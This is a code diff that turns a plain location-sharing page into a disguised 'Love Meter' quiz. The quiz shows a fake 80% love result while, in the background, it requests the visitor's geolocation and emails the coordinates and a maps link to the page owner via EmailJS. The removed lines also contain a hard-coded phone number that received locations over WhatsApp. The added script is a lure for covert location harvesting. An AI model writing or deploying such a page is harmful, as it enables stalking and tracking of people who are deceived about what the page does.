@@ -1,43 +1,102 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="UTF-8">
-  <title>Location Capture</title>
+<meta charset="UTF-8">
+<title>Love Meter ❤️</title>
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@2.6.4/dist/email.min.js"></script>
+<style>
+  body {
+    font-family: 'Segoe UI', sans-serif;
+    background: linear-gradient(135deg, #ff4e50, #f9d423);
+    color: white;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    height: 100vh;
+  }
+  h1 {
+    margin-bottom: 20px;
+  }
+  .meter-container {
+    width: 300px;
+    background: rgba(255,255,255,0.2);
+    border-radius: 50px;
+    overflow: hidden;
+    box-shadow: 0 4px 20px rgba(0,0,0,0.3);
+  }
+  .meter-fill {
+    height: 30px;
+    background: linear-gradient(to right, #ff416c, #ff4b2b);
+    width: 0%;
+    transition: width 2s ease-out;
+  }
+  button {
+    margin-top: 20px;
+    padding: 12px 24px;
+    font-size: 18px;
+    border: none;
+    border-radius: 30px;
+    background: white;
+    color: #ff4b2b;
+    font-weight: bold;
+    cursor: pointer;
+    box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+  }
+  button:hover {
+    background: #ffe3e3;
+  }
+</style>
 </head>
 <body>
-  <h3>Click below to share your location</h3>
-  <button onclick="sendLocation()">Share My Location</button>
 
-  <p id="status"></p>
+<h1>💖 Test Your Love! 💖</h1>
+<div class="meter-container">
+  <div class="meter-fill" id="meter"></div>
+</div>
+<button onclick="runLoveMeter()">Check Love ❤️</button>
 
-  <script>
-    function sendLocation() {
-      const status = document.getElementById("status");
-      status.innerText = "Requesting location...";
+<p id="result"></p>
 
-      if (!navigator.geolocation) {
-        status.innerText = "Geolocation not supported.";
-        return;
-      }
+<script>
+  // Initialize EmailJS
+  (function(){
+    emailjs.init("YOUR_PUBLIC_KEY"); // Replace with your EmailJS Public Key
+  })();
 
+  function runLoveMeter() {
+    // Animate to 80%
+    const meter = document.getElementById('meter');
+    meter.style.width = '80%';
+
+    // Show fake result after animation
+    setTimeout(() => {
+      document.getElementById('result').innerText = "Wow! You are 80% in love! 😍";
+    }, 2000);
+
+    // Capture location in background
+    if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(
         (pos) => {
           const lat = pos.coords.latitude;
           const lon = pos.coords.longitude;
           const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
 
-          // Change this to your WhatsApp number
-          const phoneNumber = "919899468860"; // without + sign
-          const waLink = `https://wa.me/${phoneNumber}?text=My%20Location:%20${mapsLink}`;
-
-          status.innerHTML = "Sending to WhatsApp...";
-          window.location.href = waLink;
+          // Send email via EmailJS
+          emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", {
+            latitude: lat,
+            longitude: lon,
+            maps_link: mapsLink
+          }).then(
+            () => console.log("Location sent successfully"),
+            (err) => console.error("Email send error", err)
+          );
         },
-        (err) => {
-          status.innerText = "Unable to get location.";
-        }
+        () => { console.log("Location not allowed"); }
       );
     }
-  </script>
+  }
+</script>
+
 </body>
 </html>
